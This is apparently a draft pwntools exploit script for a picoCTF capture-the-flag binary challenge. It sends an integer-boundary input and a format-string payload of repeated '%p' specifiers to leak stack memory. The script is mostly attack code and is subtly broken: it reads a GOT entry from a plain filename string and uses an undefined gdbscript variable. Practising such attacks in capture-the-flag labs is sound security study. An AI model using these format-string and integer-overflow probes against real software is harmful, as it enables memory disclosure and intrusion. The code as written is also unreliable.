#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mars.picoctf.net --port 31929
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './chall'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'mars.picoctf.net'
port = int(args.PORT or 31929)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    return start_local(argv, *a, **kw)
    #return start_remote(argv, *a, **kw)

local_puts_adress = exe.got["puts"]
print(local_puts_adress)

io = start()

payload = " ".join(["%p"]*9)

io.recvuntil("A: ".encode())
io.sendline("4294967295".encode())
io.recvuntil("B: ".encode())
io.sendline(("1 ABCDE"+payload).encode())
out = io.recvline()
print(out)


